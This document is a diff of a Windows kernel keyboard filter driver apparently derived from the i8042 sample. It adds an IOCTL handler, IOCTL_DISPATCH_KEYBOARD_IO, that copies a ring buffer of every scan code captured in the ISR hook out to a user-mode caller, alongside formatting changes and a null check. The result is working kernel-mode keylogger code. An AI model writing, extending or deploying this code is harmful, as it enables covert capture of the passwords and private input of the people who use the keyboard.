@@ -45,24 +45,43 @@ Environment:
 #pragma alloc_text (PAGE, KbFilter_EvtIoInternalDeviceControl)
 #endif
 
-#define MAX_KEY_BUFFER 256
-
 UCHAR KeyBuffer[MAX_KEY_BUFFER];
 ULONG KeyBufferIndex = 0;
 FAST_MUTEX KeyBufferMutex;
 
-VOID InitializeKeyBuffer() {
+VOID InitializeKeyBuffer() 
+{
+    DebugPrint(("Initializing key buffer...\n"));
     RtlZeroMemory(KeyBuffer, sizeof(KeyBuffer));
     KeyBufferIndex = 0;
     ExInitializeFastMutex(&KeyBufferMutex);
 }
 
-VOID AddKeyToBuffer(UCHAR key) {
+VOID AddKeyToBuffer(
+    UCHAR key
+) 
+{
     ExAcquireFastMutex(&KeyBufferMutex);
-    DebugPrint(("Key pressed: 0x%X\n", key));
+    DebugPrint(("Adding key to buffer: 0x%X.\n", key));
     KeyBuffer[KeyBufferIndex] = key;
     KeyBufferIndex = ++KeyBufferIndex % MAX_KEY_BUFFER;
     ExReleaseFastMutex(&KeyBufferMutex);
+}
+
+VOID CopyKeyBufferToUserSpace(
+    IN WDFREQUEST Request,
+    IN ULONG OutputBufferLength
+)
+{
+    if (OutputBufferLength >= sizeof(KeyBuffer)) {
+        DebugPrint(("Trying to copy memory in IOCTL_DISPATCH_KEYBOARD_IO...\n"));
+        RtlCopyMemory(WdfRequestGetOutputBuffer(Request), KeyBuffer, sizeof(KeyBuffer));
+        WdfRequestComplete(Request, STATUS_SUCCESS);
+    }
+    else {
+        DebugPrint(("Buffer too small in IOCTL_DISPATCH_KEYBOARD_IO.\n"));
+        WdfRequestComplete(Request, STATUS_BUFFER_TOO_SMALL);
+    }
 }
 
 ULONG InstanceNo = 0;
@@ -429,9 +448,9 @@ Return Value:
 
     switch (IoControlCode) {
 
-    //
-    // Connect a keyboard class device driver to the port driver.
-    //
+        //
+        // Connect a keyboard class device driver to the port driver.
+        //
     case IOCTL_INTERNAL_KEYBOARD_CONNECT:
         //
         // Only allow one connection.
@@ -446,10 +465,10 @@ Return Value:
         // (Parameters.DeviceIoControl.Type3InputBuffer).
         //
         status = WdfRequestRetrieveInputBuffer(Request,
-                                    sizeof(CONNECT_DATA),
-                                    &connectData,
-                                    &length);
-        if(!NT_SUCCESS(status)){
+            sizeof(CONNECT_DATA),
+            &connectData,
+            &length);
+        if (!NT_SUCCESS(status)) {
             DebugPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
             break;
         }
@@ -473,9 +492,9 @@ Return Value:
 
         break;
 
-    //
-    // Disconnect a keyboard class device driver from the port driver.
-    //
+        //
+        // Disconnect a keyboard class device driver from the port driver.
+        //
     case IOCTL_INTERNAL_KEYBOARD_DISCONNECT:
 
         //
@@ -487,11 +506,11 @@ Return Value:
         status = STATUS_NOT_IMPLEMENTED;
         break;
 
-    //
-    // Attach this driver to the initialization and byte processing of the
-    // i8042 (ie PS/2) keyboard.  This is only necessary if you want to do PS/2
-    // specific functions, otherwise hooking the CONNECT_DATA is sufficient
-    //
+        //
+        // Attach this driver to the initialization and byte processing of the
+        // i8042 (ie PS/2) keyboard.  This is only necessary if you want to do PS/2
+        // specific functions, otherwise hooking the CONNECT_DATA is sufficient
+        //
     case IOCTL_INTERNAL_I8042_HOOK_KEYBOARD:
 
         DebugPrint(("hook keyboard received!\n"));
@@ -501,10 +520,10 @@ Return Value:
         // (Parameters.DeviceIoControl.Type3InputBuffer)
         //
         status = WdfRequestRetrieveInputBuffer(Request,
-                            sizeof(INTERNAL_I8042_HOOK_KEYBOARD),
-                            &hookKeyboard,
-                            &length);
-        if(!NT_SUCCESS(status)){
+            sizeof(INTERNAL_I8042_HOOK_KEYBOARD),
+            &hookKeyboard,
+            &length);
+        if (!NT_SUCCESS(status)) {
             DebugPrint(("WdfRequestRetrieveInputBuffer failed %x\n", status));
             break;
         }
@@ -520,7 +539,7 @@ Return Value:
         //
         // replace old Context with our own
         //
-        hookKeyboard->Context = (PVOID) devExt;
+        hookKeyboard->Context = (PVOID)devExt;
 
         if (hookKeyboard->InitializationRoutine) {
             devExt->UpperInitializationRoutine =
@@ -533,7 +552,7 @@ Return Value:
         if (hookKeyboard->IsrRoutine) {
             devExt->UpperIsrHook = hookKeyboard->IsrRoutine;
         }
-        hookKeyboard->IsrRoutine = (PI8042_KEYBOARD_ISR) KbFilter_IsrHook;
+        hookKeyboard->IsrRoutine = (PI8042_KEYBOARD_ISR)KbFilter_IsrHook;
 
         //
         // Store all of the other important stuff
@@ -550,17 +569,25 @@ Return Value:
         forwardWithCompletionRoutine = TRUE;
         completionContext = devExt;
         break;
-        
-    //
-    // Might want to capture these in the future.  For now, then pass them down
-    // the stack.  These queries must be successful for the RIT to communicate
-    // with the keyboard.
-    //
+
+        //
+        // Might want to capture these in the future.  For now, then pass them down
+        // the stack.  These queries must be successful for the RIT to communicate
+        // with the keyboard.
+        //
     case IOCTL_KEYBOARD_QUERY_INDICATOR_TRANSLATION:
     case IOCTL_KEYBOARD_QUERY_INDICATORS:
     case IOCTL_KEYBOARD_SET_INDICATORS:
     case IOCTL_KEYBOARD_QUERY_TYPEMATIC:
     case IOCTL_KEYBOARD_SET_TYPEMATIC:
+        break;
+    case IOCTL_DISPATCH_KEYBOARD_IO:
+        DebugPrint(("Received IOCTL_DISPATCH_KEYBOARD_IO\n"));
+
+        ExAcquireFastMutex(&KeyBufferMutex);
+        CopyKeyBufferToUserSpace(Request, OutputBufferLength);
+        ExReleaseFastMutex(&KeyBufferMutex);
+
         break;
     }
 
@@ -780,7 +807,7 @@ Return Value:
         }
     }
 
-    if (*DataByte != 0) {
+    if (DataByte != NULL && *DataByte != 0) {
         AddKeyToBuffer(*DataByte);
     }
 
